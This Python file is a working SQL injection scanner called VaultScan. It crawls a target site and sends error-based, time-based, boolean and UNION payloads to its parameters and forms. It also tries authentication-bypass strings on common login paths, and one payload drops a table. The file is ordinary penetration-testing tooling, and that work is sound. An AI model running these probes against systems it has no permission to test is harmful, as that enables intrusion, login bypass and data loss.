#!/usr/bin/env python3
"""
VaultScan - Comprehensive SQL Injection Scanner
================================================
Tests URL parameters and form inputs for SQL injection vulnerabilities
using error-based, time-based blind, boolean-based blind, and UNION-based
detection techniques. Crawls same-domain pages and tests discovered
parameters and forms. Includes WAF detection and rate limiting.

Outputs JSON array of findings to stdout.
"""

import re
import sys
import os
import time
from typing import Dict, List, Optional, Tuple, Any

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from scan_utils import (
    is_mock_mode,
    output_findings,
    output_error,
    base_argparser,
    normalize_url,
    create_session,
    safe_request,
    rate_limited_request,
    make_finding,
    extract_forms,
    extract_url_params,
    replace_url_param,
    crawl_same_domain,
    measure_response_time,
    get_baseline_time,
    detect_waf,
    is_same_domain,
)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
CATEGORY = "INJECTION"
TIME_THRESHOLD = 4.0  # Seconds above baseline to flag time-based SQLi
BOOLEAN_LENGTH_DIFF_RATIO = 0.20  # 20% length difference threshold
MAX_CRAWL_PAGES = 5  # Reduced from 10 for speed
MAX_UNION_COLUMNS = 6  # Reduced from 10 for speed
TESTABLE_INPUT_TYPES = {"text", "search", "hidden", "password", "email", "url", "tel", "number"}
WAF_SAMPLE_SIZE = 4  # Reduced from 6 for speed

# ---------------------------------------------------------------------------
# Error-Based Payloads (16+)
# ---------------------------------------------------------------------------
ERROR_PAYLOADS: List[str] = [
    "'",
    '"',
    "--",
    "#",
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR ""="',
    "1' ORDER BY 1--",
    "'; DROP TABLE test; --",
    "admin'--",
    "1' AND '1'='1' /*",
    "') OR ('1'='1",
    "1; SELECT 1",
    "' OR 'x'='x",
    "1' OR '1'='1' #",
    "' HAVING 1=1--",
    "' GROUP BY 1--",
    "1' AND EXTRACTVALUE(1,1)--",
]

# ---------------------------------------------------------------------------
# SQL Error Patterns (20+) — regex pattern, DB type
# ---------------------------------------------------------------------------
SQL_ERROR_PATTERNS: List[Tuple[str, str]] = [
    # MySQL
    (r"SQL syntax.*?MySQL", "MySQL"),
    (r"mysql_fetch", "MySQL"),
    (r"MySQLSyntaxErrorException", "MySQL"),
    (r"valid MySQL result", "MySQL"),
    (r"mysql_num_rows", "MySQL"),
    # PostgreSQL
    (r"PostgreSQL.*?ERROR", "PostgreSQL"),
    (r"pg_query\(\):", "PostgreSQL"),
    (r"Warning.*?\Wpg_", "PostgreSQL"),
    (r"PSQLException", "PostgreSQL"),
    # MSSQL
    (r"Unclosed quotation mark", "MSSQL"),
    (r"Microsoft SQL Server", "MSSQL"),
    (r"ODBC SQL Server Driver", "MSSQL"),
    (r"mssql_query\(\)", "MSSQL"),
    # Oracle
    (r"ORA-\d{5}", "Oracle"),
    (r"Oracle.*?Driver", "Oracle"),
    (r"quoted string not properly terminated", "Oracle"),
    # SQLite
    (r"SQLite3?::query", "SQLite"),
    (r"sqlite3\.OperationalError", "SQLite"),
    (r"SQLITE_ERROR", "SQLite"),
    # Generic / Java
    (r"SQLSTATE\[", "Generic SQL"),
    (r"Syntax error.*?SQL", "Generic SQL"),
    (r"JDBC.*?Exception", "Java/JDBC"),
    (r"java\.sql\.SQLException", "Java/JDBC"),
    (r"Hibernate.*?Exception", "Java/JDBC"),
]

# ---------------------------------------------------------------------------
# Time-Based Blind Payloads (8+)
# ---------------------------------------------------------------------------
TIME_PAYLOADS: List[Tuple[str, str]] = [
    # (payload_template, db_hint)
    ("' OR SLEEP(5)--", "MySQL"),
    ("1' AND SLEEP(5)--", "MySQL"),
    ("1' AND BENCHMARK(5000000,SHA1('test'))--", "MySQL"),
    ("'; WAITFOR DELAY '0:0:5'--", "MSSQL"),
    ("1'; WAITFOR DELAY '0:0:5'--", "MSSQL"),
    ("'; SELECT pg_sleep(5)--", "PostgreSQL"),
    ("1'; SELECT pg_sleep(5)--", "PostgreSQL"),
    ("' || (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--", "PostgreSQL"),
    ("1' AND (SELECT * FROM (SELECT SLEEP(5))a)--", "MySQL"),
]

# ---------------------------------------------------------------------------
# Boolean-Based Blind Payload Pairs (8+)
# ---------------------------------------------------------------------------
BOOLEAN_PAIRS: List[Tuple[str, str, str]] = [
    # (true_payload, false_payload, description)
    ("' AND 1=1--", "' AND 1=2--", "AND numeric comparison"),
    ("' AND 'a'='a", "' AND 'a'='b", "AND string comparison"),
    ("' OR 1=1--", "' OR 1=2--", "OR numeric comparison"),
    ("') AND 1=1--", "') AND 1=2--", "AND with closing paren"),
    ("' AND 1=1 #", "' AND 1=2 #", "AND with hash comment"),
    ("1' AND 1=1--", "1' AND 1=2--", "Numeric prefix AND"),
    ("1 AND 1=1", "1 AND 1=2", "Integer AND comparison"),
    ("' AND SUBSTRING('a',1,1)='a", "' AND SUBSTRING('a',1,1)='b", "SUBSTRING comparison"),
]


# ---------------------------------------------------------------------------
# Error-Based SQL Injection Detection
# ---------------------------------------------------------------------------
def test_error_based(
    session,
    url: str,
    param: str,
    value: str,
    delay: float,
    timeout: int,
) -> List[Dict]:
    """
    Test a URL parameter for error-based SQL injection.
    Injects each error payload and checks the response body for SQL error strings.
    Returns a list of findings (at most one per payload that triggers a new DB type).
    """
    findings: List[Dict] = []
    detected_dbs: set = set()

    for payload in ERROR_PAYLOADS:
        injected_value = value + payload
        test_url = replace_url_param(url, param, injected_value)

        resp, err = rate_limited_request(session, "GET", test_url, delay=delay, timeout=timeout)
        if err or resp is None:
            continue

        body = resp.text
        for pattern, db_type in SQL_ERROR_PATTERNS:
            if db_type in detected_dbs:
                continue
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                detected_dbs.add(db_type)
                findings.append(make_finding(
                    vulnerability=f"Error-Based SQL Injection ({db_type})",
                    severity="HIGH",
                    location=f"{url} [param: {param}]",
                    evidence=(
                        f"Payload '{payload}' in parameter '{param}' triggered "
                        f"{db_type} error pattern: {match.group(0)[:120]}"
                    ),
                    category=CATEGORY,
                    raw_details={
                        "technique": "error-based",
                        "parameter": param,
                        "payload": payload,
                        "db_type": db_type,
                        "error_pattern": pattern,
                        "matched_text": match.group(0)[:200],
                        "status_code": resp.status_code,
                    },
                ))
                break  # One finding per payload is enough

    return findings


# ---------------------------------------------------------------------------
# Time-Based Blind SQL Injection Detection
# ---------------------------------------------------------------------------
def test_time_based(
    session,
    url: str,
    param: str,
    baseline_time: float,
    delay: float,
    timeout: int,
) -> List[Dict]:
    """
    Test a URL parameter for time-based blind SQL injection.
    Compares each timed payload against the baseline response time.
    """
    findings: List[Dict] = []
    detected_dbs: set = set()

    for payload, db_hint in TIME_PAYLOADS:
        if db_hint in detected_dbs:
            continue

        test_url = replace_url_param(url, param, payload)
        time.sleep(delay)

        resp, elapsed, err = measure_response_time(
            session, "GET", test_url, timeout=max(timeout, 15),
        )
        if err:
            continue

        deviation = elapsed - baseline_time
        if deviation > TIME_THRESHOLD:
            detected_dbs.add(db_hint)
            findings.append(make_finding(
                vulnerability=f"Time-Based Blind SQL Injection ({db_hint})",
                severity="CRITICAL",
                location=f"{url} [param: {param}]",
                evidence=(
                    f"Payload '{payload}' caused {elapsed:.2f}s response "
                    f"(baseline {baseline_time:.2f}s, deviation +{deviation:.2f}s)"
                ),
                category=CATEGORY,
                raw_details={
                    "technique": "time-based-blind",
                    "parameter": param,
                    "payload": payload,
                    "db_hint": db_hint,
                    "baseline_seconds": round(baseline_time, 3),
                    "response_seconds": round(elapsed, 3),
                    "deviation_seconds": round(deviation, 3),
                },
            ))

    return findings


# ---------------------------------------------------------------------------
# Boolean-Based Blind SQL Injection Detection
# ---------------------------------------------------------------------------
def test_boolean_blind(
    session,
    url: str,
    param: str,
    value: str,
    delay: float,
    timeout: int,
) -> List[Dict]:
    """
    Test a URL parameter for boolean-based blind SQL injection.
    Sends true/false payload pairs and compares response lengths.
    A significant difference indicates controllable boolean logic in the query.
    """
    findings: List[Dict] = []

    for true_payload, false_payload, description in BOOLEAN_PAIRS:
        true_url = replace_url_param(url, param, value + true_payload)
        resp_true, err_true = rate_limited_request(
            session, "GET", true_url, delay=delay, timeout=timeout,
        )
        if err_true or resp_true is None:
            continue

        false_url = replace_url_param(url, param, value + false_payload)
        resp_false, err_false = rate_limited_request(
            session, "GET", false_url, delay=delay, timeout=timeout,
        )
        if err_false or resp_false is None:
            continue

        len_true = len(resp_true.text)
        len_false = len(resp_false.text)
        max_len = max(len_true, len_false, 1)
        diff_ratio = abs(len_true - len_false) / max_len

        if diff_ratio > BOOLEAN_LENGTH_DIFF_RATIO:
            findings.append(make_finding(
                vulnerability="Boolean-Based Blind SQL Injection",
                severity="HIGH",
                location=f"{url} [param: {param}]",
                evidence=(
                    f"Payload pair ({description}): true-condition response "
                    f"length={len_true}, false-condition length={len_false} "
                    f"(diff {diff_ratio:.1%})"
                ),
                category=CATEGORY,
                raw_details={
                    "technique": "boolean-based-blind",
                    "parameter": param,
                    "true_payload": true_payload,
                    "false_payload": false_payload,
                    "true_length": len_true,
                    "false_length": len_false,
                    "diff_ratio": round(diff_ratio, 4),
                    "description": description,
                },
            ))
            break  # One confirmed pair is sufficient per parameter

    return findings


# ---------------------------------------------------------------------------
# UNION-Based SQL Injection Detection
# ---------------------------------------------------------------------------
def test_union_based(
    session,
    url: str,
    param: str,
    value: str,
    delay: float,
    timeout: int,
) -> List[Dict]:
    """
    Test a URL parameter for UNION-based SQL injection.
    Attempts UNION SELECT NULL with 1-10 columns and checks whether the
    response lacks SQL error indicators (suggesting a successful UNION).
    """
    findings: List[Dict] = []

    # Collect a baseline response for comparison
    baseline_url = replace_url_param(url, param, value)
    resp_base, err_base = safe_request(session, "GET", baseline_url, timeout=timeout)
    if err_base or resp_base is None:
        return findings
    baseline_len = len(resp_base.text)

    for col_count in range(1, MAX_UNION_COLUMNS + 1):
        nulls = ",".join(["NULL"] * col_count)
        payload = f"' UNION SELECT {nulls}--"
        test_url = replace_url_param(url, param, value + payload)

        resp, err = rate_limited_request(
            session, "GET", test_url, delay=delay, timeout=timeout,
        )
        if err or resp is None:
            continue

        body = resp.text

        # Check if any SQL error pattern is present (means UNION failed)
        has_sql_error = any(
            re.search(pat, body, re.IGNORECASE)
            for pat, _ in SQL_ERROR_PATTERNS
        )

        if has_sql_error:
            continue  # UNION syntax was rejected; try more columns

        # If the response differs meaningfully from baseline and has no SQL error,
        # the UNION may have been accepted.
        resp_len = len(body)
        if resp_len != baseline_len and abs(resp_len - baseline_len) > 50:
            findings.append(make_finding(
                vulnerability="UNION-Based SQL Injection",
                severity="HIGH",
                location=f"{url} [param: {param}]",
                evidence=(
                    f"Payload 'UNION SELECT {nulls}' ({col_count} column(s)) "
                    f"returned a response without SQL errors and differing length "
                    f"(baseline={baseline_len}, injected={resp_len})"
                ),
                category=CATEGORY,
                raw_details={
                    "technique": "union-based",
                    "parameter": param,
                    "payload": payload,
                    "columns": col_count,
                    "baseline_length": baseline_len,
                    "response_length": resp_len,
                    "status_code": resp.status_code,
                },
            ))
            break  # Found valid column count

    return findings


# ---------------------------------------------------------------------------
# Test All URL Parameters on a Single URL
# ---------------------------------------------------------------------------
def test_url_params(
    session,
    url: str,
    delay: float,
    timeout: int,
) -> Tuple[List[Dict], List]:
    """
    Extract query parameters from *url* and run all four injection
    techniques against each parameter.
    Returns (findings, collected_responses_for_waf_check).
    """
    findings: List[Dict] = []
    waf_responses: List = []
    params = extract_url_params(url)

    if not params:
        return findings, waf_responses

    # Compute baseline response time once per URL
    baseline_time = get_baseline_time(session, url, timeout=timeout)

    for param, values in params.items():
        original_value = values[0] if values else ""

        # --- Error-based ---
        for payload in ERROR_PAYLOADS[:WAF_SAMPLE_SIZE]:
            test_url = replace_url_param(url, param, original_value + payload)
            resp, _ = rate_limited_request(session, "GET", test_url, delay=delay, timeout=timeout)
            if resp is not None:
                waf_responses.append(resp)

        if detect_waf(waf_responses):
            return findings, waf_responses  # Abort early for this URL

        findings.extend(test_error_based(session, url, param, original_value, delay, timeout))
        findings.extend(test_time_based(session, url, param, baseline_time, delay, timeout))
        findings.extend(test_boolean_blind(session, url, param, original_value, delay, timeout))
        findings.extend(test_union_based(session, url, param, original_value, delay, timeout))

    return findings, waf_responses


# ---------------------------------------------------------------------------
# Test Forms on a Page
# ---------------------------------------------------------------------------
def test_forms(
    session,
    url: str,
    html: str,
    delay: float,
    timeout: int,
) -> Tuple[List[Dict], List]:
    """
    Extract forms from *html*, then test each injectable input with
    error-based and time-based payloads via the form's action URL.
    Returns (findings, collected_responses_for_waf_check).
    """
    findings: List[Dict] = []
    waf_responses: List = []
    forms = extract_forms(url, html)

    for form in forms:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])

        for inp in inputs:
            inp_type = inp.get("type", "text").lower()
            if inp_type not in TESTABLE_INPUT_TYPES:
                continue

            inp_name = inp["name"]
            found_vuln = False

            # Build base form data (fill other fields with benign values)
            base_data: Dict[str, str] = {}
            for other in inputs:
                if other["name"] == inp_name:
                    continue
                base_data[other["name"]] = other.get("value", "") or "test"

            # --- Error-based via form ---
            for payload in ERROR_PAYLOADS:
                form_data = {**base_data, inp_name: payload}

                if method == "POST":
                    resp, err = rate_limited_request(
                        session, "POST", action, delay=delay, timeout=timeout, data=form_data,
                    )
                else:
                    resp, err = rate_limited_request(
                        session, "GET", action, delay=delay, timeout=timeout, params=form_data,
                    )

                if err or resp is None:
                    continue
                waf_responses.append(resp)

                body = resp.text
                for pattern, db_type in SQL_ERROR_PATTERNS:
                    match = re.search(pattern, body, re.IGNORECASE)
                    if match:
                        findings.append(make_finding(
                            vulnerability=f"Error-Based SQL Injection in Form ({db_type})",
                            severity="HIGH",
                            location=f"{action} [form field: {inp_name}]",
                            evidence=(
                                f"Payload '{payload}' in form field '{inp_name}' "
                                f"({method}) triggered {db_type} error: "
                                f"{match.group(0)[:120]}"
                            ),
                            category=CATEGORY,
                            raw_details={
                                "technique": "error-based-form",
                                "form_action": action,
                                "form_method": method,
                                "field": inp_name,
                                "payload": payload,
                                "db_type": db_type,
                                "error_pattern": pattern,
                            },
                        ))
                        found_vuln = True
                        break
                if found_vuln:
                    break

            # --- Time-based via form ---
            baseline_time = get_baseline_time(session, action, timeout=timeout)
            for payload, db_hint in TIME_PAYLOADS:
                form_data = {**base_data, inp_name: payload}
                time.sleep(delay)

                if method == "POST":
                    resp, elapsed, err = measure_response_time(
                        session, "POST", action, timeout=max(timeout, 15), data=form_data,
                    )
                else:
                    resp, elapsed, err = measure_response_time(
                        session, "GET", action, timeout=max(timeout, 15), params=form_data,
                    )

                if err:
                    continue

                deviation = elapsed - baseline_time
                if deviation > TIME_THRESHOLD:
                    findings.append(make_finding(
                        vulnerability=f"Time-Based Blind SQL Injection in Form ({db_hint})",
                        severity="CRITICAL",
                        location=f"{action} [form field: {inp_name}]",
                        evidence=(
                            f"Payload '{payload}' in form field '{inp_name}' "
                            f"({method}) caused {elapsed:.2f}s response "
                            f"(baseline {baseline_time:.2f}s, +{deviation:.2f}s)"
                        ),
                        category=CATEGORY,
                        raw_details={
                            "technique": "time-based-blind-form",
                            "form_action": action,
                            "form_method": method,
                            "field": inp_name,
                            "payload": payload,
                            "db_hint": db_hint,
                            "baseline_seconds": round(baseline_time, 3),
                            "response_seconds": round(elapsed, 3),
                        },
                    ))
                    break  # One time-based finding per field is enough

    return findings, waf_responses


# ---------------------------------------------------------------------------
# Mock Findings
# ---------------------------------------------------------------------------
def _test_login_bypass(
    session, target: str, timeout: int
) -> List[Dict]:
    """
    Fast SQL injection test on login forms: try auth bypass payloads
    directly on login pages without crawling.
    """
    findings: List[Dict] = []
    login_paths = [
        "", "/login", "/signin", "/admin", "/user/login",
        "/login.php", "/login.asp", "/login.aspx", "/login.jsp",
        "/admin/login", "/auth/login", "/account/login",
    ]

    bypass_payloads = [
        ("' OR 1=1 --", "Classic OR bypass"),
        ("admin'--", "Comment after admin"),
        ("' OR '1'='1' --", "String OR bypass"),
        ("') OR ('1'='1", "Parenthesized OR bypass"),
        ("admin' OR '1'='1", "Admin OR bypass"),
    ]

    for path in login_paths:
        url = f"{target}{path}" if path else target
        resp, err = safe_request(session, "GET", url, timeout=timeout)
        if err or not resp or resp.status_code != 200:
            continue

        forms = extract_forms(url, resp.text)
        for form in forms:
            # Find password field (indicates login form)
            has_password = any(
                inp.get("type") == "password" for inp in form.get("inputs", [])
            )
            if not has_password:
                continue

            action = form.get("action", url)
            method = form.get("method", "POST").upper()

            # Build base data
            username_field = None
            password_field = None
            base_data: Dict[str, str] = {}
            for inp in form.get("inputs", []):
                name = inp.get("name")
                if not name:
                    continue
                if inp.get("type") == "password":
                    password_field = name
                    base_data[name] = "test123"
                elif inp.get("type") in ("text", "email", "") or "user" in name.lower() or "email" in name.lower() or "login" in name.lower():
                    username_field = name
                    base_data[name] = "test_user"
                else:
                    base_data[name] = inp.get("value", "")

            if not username_field or not password_field:
                continue

            # Get baseline (failed login)
            baseline_resp, _ = safe_request(
                session, method, action, timeout=timeout,
                data=base_data if method == "POST" else None,
                params=base_data if method == "GET" else None,
                allow_redirects=False,
            )
            if not baseline_resp:
                continue

            baseline_url = baseline_resp.headers.get("Location", "")
            baseline_status = baseline_resp.status_code
            baseline_len = len(baseline_resp.text)

            # Test each bypass payload
            for payload, desc in bypass_payloads:
                test_data = {**base_data, username_field: payload}
                test_resp, err = safe_request(
                    session, method, action, timeout=timeout,
                    data=test_data if method == "POST" else None,
                    params=test_data if method == "GET" else None,
                    allow_redirects=False,
                )
                if err or not test_resp:
                    continue

                # Check for SQL error in response (error-based)
                for pattern, db_type in SQL_ERROR_PATTERNS:
                    match = re.search(pattern, test_resp.text, re.IGNORECASE)
                    if match:
                        findings.append(make_finding(
                            vulnerability=f"SQL Injection in Login Form ({db_type})",
                            severity="CRITICAL",
                            location=f"{action} [field: {username_field}]",
                            evidence=(
                                f"Payload '{payload}' ({desc}) triggered {db_type} error: "
                                f"{match.group(0)[:150]}"
                            ),
                            category=CATEGORY,
                            raw_details={
                                "technique": "error-based-login",
                                "form_action": action,
                                "field": username_field,
                                "payload": payload,
                                "db_type": db_type,
                            },
                        ))
                        return findings  # One critical finding is enough

                # Check for auth bypass (redirect to different page or different response)
                test_url = test_resp.headers.get("Location", "")
                test_status = test_resp.status_code
                test_len = len(test_resp.text)

                # Redirect to a different URL (dashboard/admin) = bypass
                if test_status in (301, 302, 303, 307, 308):
                    if test_url != baseline_url and baseline_status not in (301, 302, 303, 307, 308):
                        # Baseline didn't redirect but payload did = bypass!
                        findings.append(make_finding(
                            vulnerability="SQL Injection Authentication Bypass",
                            severity="CRITICAL",
                            location=f"{action} [field: {username_field}]",
                            evidence=(
                                f"Payload '{payload}' ({desc}) bypassed authentication. "
                                f"Baseline returned {baseline_status}, payload caused redirect "
                                f"to {test_url}"
                            ),
                            category=CATEGORY,
                            raw_details={
                                "technique": "auth-bypass",
                                "form_action": action,
                                "field": username_field,
                                "payload": payload,
                                "redirect_to": test_url,
                            },
                        ))
                        return findings

                    if test_url and test_url != baseline_url:
                        # Both redirect but to different places
                        bypass_indicators = ["dashboard", "admin", "home", "portal", "main", "account", "welcome"]
                        if any(ind in test_url.lower() for ind in bypass_indicators):
                            findings.append(make_finding(
                                vulnerability="SQL Injection Authentication Bypass",
                                severity="CRITICAL",
                                location=f"{action} [field: {username_field}]",
                                evidence=(
                                    f"Payload '{payload}' ({desc}) redirected to '{test_url}' "
                                    f"(baseline went to '{baseline_url}')"
                                ),
                                category=CATEGORY,
                                raw_details={
                                    "technique": "auth-bypass",
                                    "form_action": action,
                                    "field": username_field,
                                    "payload": payload,
                                    "redirect_to": test_url,
                                    "baseline_redirect": baseline_url,
                                },
                            ))
                            return findings

                # Response significantly different (could be successful login page)
                if abs(test_len - baseline_len) > baseline_len * 0.3 and test_len > baseline_len:
                    bypass_words = ["welcome", "dashboard", "logout", "account", "profile", "admin"]
                    body_lower = test_resp.text[:3000].lower()
                    if any(w in body_lower for w in bypass_words):
                        findings.append(make_finding(
                            vulnerability="SQL Injection Authentication Bypass",
                            severity="CRITICAL",
                            location=f"{action} [field: {username_field}]",
                            evidence=(
                                f"Payload '{payload}' ({desc}) returned a significantly "
                                f"different response (baseline={baseline_len}b, "
                                f"payload={test_len}b) containing authenticated content."
                            ),
                            category=CATEGORY,
                            raw_details={
                                "technique": "auth-bypass",
                                "form_action": action,
                                "field": username_field,
                                "payload": payload,
                            },
                        ))
                        return findings

            return findings  # Only test first login form found

    return findings


def get_mock_findings(target: str) -> List[Dict]:
    """Return realistic mock findings covering every detection technique."""
    return [
        make_finding(
            vulnerability="Error-Based SQL Injection (MySQL)",
            severity="HIGH",
            location=f"{target}?id=1 [param: id]",
            evidence=(
                "Payload ' OR '1'='1 in parameter 'id' triggered "
                "MySQL error pattern: SQL syntax error near '1'='1' at line 1"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "error-based",
                "parameter": "id",
                "payload": "' OR '1'='1",
                "db_type": "MySQL",
                "error_pattern": r"SQL syntax.*?MySQL",
                "matched_text": "SQL syntax error near '1'='1' at line 1",
                "status_code": 500,
            },
        ),
        make_finding(
            vulnerability="Time-Based Blind SQL Injection (MySQL)",
            severity="CRITICAL",
            location=f"{target}?id=1 [param: id]",
            evidence=(
                "Payload ' OR SLEEP(5)-- caused 5.34s response "
                "(baseline 0.21s, deviation +5.13s)"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "time-based-blind",
                "parameter": "id",
                "payload": "' OR SLEEP(5)--",
                "db_hint": "MySQL",
                "baseline_seconds": 0.21,
                "response_seconds": 5.34,
                "deviation_seconds": 5.13,
            },
        ),
        make_finding(
            vulnerability="Boolean-Based Blind SQL Injection",
            severity="HIGH",
            location=f"{target}?search=test [param: search]",
            evidence=(
                "Payload pair (AND numeric comparison): true-condition "
                "response length=4520, false-condition length=1203 (diff 73.4%)"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "boolean-based-blind",
                "parameter": "search",
                "true_payload": "' AND 1=1--",
                "false_payload": "' AND 1=2--",
                "true_length": 4520,
                "false_length": 1203,
                "diff_ratio": 0.7339,
                "description": "AND numeric comparison",
            },
        ),
        make_finding(
            vulnerability="UNION-Based SQL Injection",
            severity="HIGH",
            location=f"{target}?id=1 [param: id]",
            evidence=(
                "Payload 'UNION SELECT NULL,NULL,NULL' (3 column(s)) returned "
                "a response without SQL errors and differing length "
                "(baseline=3200, injected=5480)"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "union-based",
                "parameter": "id",
                "payload": "' UNION SELECT NULL,NULL,NULL--",
                "columns": 3,
                "baseline_length": 3200,
                "response_length": 5480,
                "status_code": 200,
            },
        ),
        make_finding(
            vulnerability="Error-Based SQL Injection in Form (Generic SQL)",
            severity="HIGH",
            location=f"{target}/login [form field: username]",
            evidence=(
                "Payload admin'-- in form field 'username' (POST) "
                "triggered Generic SQL error: SQLSTATE[42000]"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "error-based-form",
                "form_action": f"{target}/login",
                "form_method": "POST",
                "field": "username",
                "payload": "admin'--",
                "db_type": "Generic SQL",
                "error_pattern": r"SQLSTATE\[",
            },
        ),
        make_finding(
            vulnerability="Time-Based Blind SQL Injection in Form (MSSQL)",
            severity="CRITICAL",
            location=f"{target}/search [form field: q]",
            evidence=(
                "Payload '; WAITFOR DELAY '0:0:5'-- in form field 'q' "
                "(GET) caused 5.82s response (baseline 0.18s, +5.64s)"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "time-based-blind-form",
                "form_action": f"{target}/search",
                "form_method": "GET",
                "field": "q",
                "payload": "'; WAITFOR DELAY '0:0:5'--",
                "db_hint": "MSSQL",
                "baseline_seconds": 0.18,
                "response_seconds": 5.82,
            },
        ),
    ]


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    parser = base_argparser("VaultScan - Comprehensive SQL Injection Scanner")
    args = parser.parse_args()

    target = normalize_url(args.target)

    # ---- Mock mode ----
    if is_mock_mode():
        output_findings(get_mock_findings(target))
        return  # output_findings calls sys.exit

    # ---- Live scan ----
    session = create_session(timeout=args.timeout, cookies=args.cookies, headers=args.headers)
    delay = args.delay
    timeout = args.timeout
    findings: List[Dict] = []
    all_waf_responses: List = []
    waf_detected = False

    # === FAST CHECK: SQL injection auth bypass on login forms ===
    findings.extend(_test_login_bypass(session, target, timeout))

    # If we already found critical auth bypass, skip slow crawling
    if any(f.get("severity") == "CRITICAL" for f in findings):
        output_findings(findings)
        return

    # Step 1: Crawl same-domain pages (limited for speed)
    try:
        pages = crawl_same_domain(
            target, session, delay=0.05, timeout=timeout, max_pages=MAX_CRAWL_PAGES,
            depth=1,  # Depth 1 for speed
        )
    except Exception:
        pages = [target]

    # Step 2: Iterate over discovered pages
    for page_url in pages:
        if waf_detected:
            break

        # Fetch page HTML for form extraction
        resp, err = safe_request(session, "GET", page_url, timeout=timeout)
        page_html = resp.text if resp else ""

        # 2a: Test URL parameters
        param_findings, param_waf = test_url_params(session, page_url, delay, timeout)
        findings.extend(param_findings)
        all_waf_responses.extend(param_waf)

        # Check WAF status after each page
        if detect_waf(all_waf_responses):
            waf_detected = True
            findings.append(make_finding(
                vulnerability="Web Application Firewall Detected",
                severity="INFO",
                location=target,
                evidence=(
                    "Over 50% of injection probe responses returned "
                    "403/429/406 status codes, indicating a WAF is active. "
                    "Aggressive testing halted to avoid IP blocking."
                ),
                category=CATEGORY,
                raw_details={
                    "technique": "waf-detection",
                    "blocked_ratio": round(
                        sum(1 for r in all_waf_responses if r and r.status_code in (403, 429, 406))
                        / max(len([r for r in all_waf_responses if r]), 1),
                        2,
                    ),
                    "total_probes": len(all_waf_responses),
                },
            ))
            break

        # 2b: Test forms
        if page_html:
            form_findings, form_waf = test_forms(session, page_url, page_html, delay, timeout)
            findings.extend(form_findings)
            all_waf_responses.extend(form_waf)

            if detect_waf(all_waf_responses):
                waf_detected = True
                findings.append(make_finding(
                    vulnerability="Web Application Firewall Detected",
                    severity="INFO",
                    location=target,
                    evidence=(
                        "WAF detected after form testing — majority of responses "
                        "were 403/429/406. Halting further testing."
                    ),
                    category=CATEGORY,
                    raw_details={"technique": "waf-detection"},
                ))
                break

    # Deduplicate findings by (vulnerability, location) to keep reports clean
    seen = set()
    unique_findings: List[Dict] = []
    for f in findings:
        key = (f["vulnerability"], f["location"])
        if key not in seen:
            seen.add(key)
            unique_findings.append(f)

    output_findings(unique_findings)


if __name__ == "__main__":
    main()
